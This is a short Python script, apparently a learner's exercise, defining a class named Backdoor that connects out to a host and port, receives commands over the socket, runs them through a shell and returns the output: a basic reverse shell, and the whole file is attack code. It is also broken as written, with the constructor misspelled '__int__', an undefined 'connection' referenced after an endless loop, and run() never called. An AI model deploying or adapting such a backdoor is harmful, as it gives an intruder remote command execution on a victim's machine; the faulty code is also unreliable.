#!/usr/bin/env python

import socket
import subprocess


class Backdoor:
    def __int__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    # connection.send("\n [+] Connection established. \n")

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_command(command)
            self.connection.send(command_result)

        connection.close()


my_backdoor = Backdoor("localhost", 4444)